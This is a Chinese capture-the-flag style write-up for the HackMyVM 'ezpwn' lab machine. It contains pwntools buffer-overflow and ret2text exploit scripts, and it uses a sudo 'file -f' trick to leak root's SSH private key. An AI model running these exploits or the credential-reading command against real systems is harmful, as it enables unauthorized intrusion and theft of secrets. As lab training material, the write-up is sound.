---
title: MazeSec ezpwn
date: 2025-11-03 12:15:13
permalink: /pages/maze-ezpwn/
categories:
  - 渗透
tags:
  - ret2text
  - gtfobins
author: 
  name: the0n3
  link: https://the0n3.top
---

## 信息收集

端口扫描

```bash
┌──(npc㉿kali)-[~/hackmyvm/ezpwn]
└─$ nmap -p- -sT 192.168.56.119

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
6538/tcp open  unknown
9999/tcp open  abyss
```



80端口，dirsearch目录扫描也没东西

```bash
┌──(npc㉿kali)-[~/hackmyvm/ezpwn]
└─$ curl http://192.168.56.119
index
```


6538是一个python的默认http web服务，提供了pwn附件下载

![](/medias/maze-ezpwn/1.png)

经过测试，9999端口是pwn题目端口


## overflow

下载附件，拖进ida

main函数，调用了init,start函数

![](/medias/maze-ezpwn/2.png)

init函数

![](/medias/maze-ezpwn/4.png)

start函数，调用了gets函数（事故多发点），符合条件时会调用port函数

![](/medias/maze-ezpwn/3.png)


port函数，调用了system函数，执行了一个port相关脚本`/home/a/overflow/port.sh`，同时说明了存在用户a

![](/medias/maze-ezpwn/5.png) 

没有保护措施

![](/medias/maze-ezpwn/6.png)


符合条件也能调用port函数，条件是输入的字符串第13个字符是'p'，第15个字符是's'，可以直接A*12 + A + 'p' + A + 's' + A

可以直接

![](/medias/maze-ezpwn/8.png)


一样的

```python
from pwn import *

ip = '192.168.56.119'
port = 9999

payload = b"A" * 12 + b"A" + b"p" + b"A" + b"s" + b"A"

p = remote(ip, port)
p.sendline(payload)
p.interactive()
```

![](/medias/maze-ezpwn/7.png)

nmap 扫描到新端口 11450

```bash
┌──(npc㉿kali)-[~/hackmyvm/ezpwn]
└─$ nmap -p- -sT 192.168.56.119

PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
6538/tcp  open  unknown
9999/tcp  open  abyss
11450/tcp open  unknown
```

### ret2text 到 ssh a用户

11450端口，还是一个python 的默认http web服务，提供了ret2text附件下载

![](/medias/maze-ezpwn/9.png)

提示，密码的位置提示了(offset)，ssh密码可能是偏移值

![](/medias/maze-ezpwn/10.png)


start函数里有gets函数

![](/medias/maze-ezpwn/11.png)

程序没有保护

![](/medias/maze-ezpwn/13.png)


存在一个后门 shell 函数

![](/medias/maze-ezpwn/12.png)

shell 函数地址

![](/medias/maze-ezpwn/14.png)

给变量 a 填充满 + 8 字节的saved rbp + shell 函数地址

```python
#!/usr/bin/env python3
from pwn import *

context.binary = './ret2text'

p = process('./ret2text')
p.recvuntil(b'a:')
shell_addr = 0x401152

payload = b'A' * 18
payload += p64(shell_addr)

print("[+] payload："+str(payload))
p.sendline(payload)
p.interactive()
```

程序崩溃了，可能栈没有对齐

![](/medias/maze-ezpwn/15.png)

找一条ret指令放shell 函数地址前面

ida使用`alt+t`快捷键，搜索`retn`，随便找一条retn指令地址

![](/medias/maze-ezpwn/16.png)

```python
#!/usr/bin/env python3
from pwn import *

context.binary = './ret2text'

p = process('./ret2text')
p.recvuntil(b'a:')
shell_addr = 0x401152

payload = b'A' * 18
ret_addr = 0x4010D0
payload += p64(ret_addr)
payload += p64(shell_addr)

print("[+] payload："+str(payload))
p.sendline(payload)
p.interactive()
```

![](/medias/maze-ezpwn/17.png)

好像没什么用，没有远程端口。

漫长思考，把提示放一起

```plaintext
# hint
password and username in the program
(offset)
# overflow
/bin/bash /home/a/overflow/port.sh
# ret2text
a:我离shell还有多远呢
```

可以猜测，ssh用户名是a，密码是偏移量18的16进制表示0x12

## root

ssh登录到a用户，密码是0x12。有条suid file命令

![](/medias/maze-ezpwn/18.png)


gtfobins里有利用方式[https://gtfobins.github.io/gtfobins/file/](https://gtfobins.github.io/gtfobins/file/)

没有root.txt，尝试读取私钥

```bash
sudo /usr/bin/file -f /root/root.txt
```

![](/medias/maze-ezpwn/19.png)

```bash
sudo /usr/bin/file -f /root/.ssh/id_rsa
```

爆出私钥，处理一下格式，删掉`:`及以后的报错信息

![](/medias/maze-ezpwn/20.png)

```bash
a@ezpwn:~$ mkdir -p .ssh
a@ezpwn:~$ cd .ssh
a@ezpwn:~/.ssh$ vim authorized_keys
a@ezpwn:~/.ssh$ vim authorized_keys
a@ezpwn:~/.ssh$ cat authorized_keys | cut -d ':' -f 1 |tee authorized_keys 
a@ezpwn:~/.ssh$ chmod 600 authorized_keys
```

![](/medias/maze-ezpwn/21.png)

ssh 到root

![](/medias/maze-ezpwn/22.png)

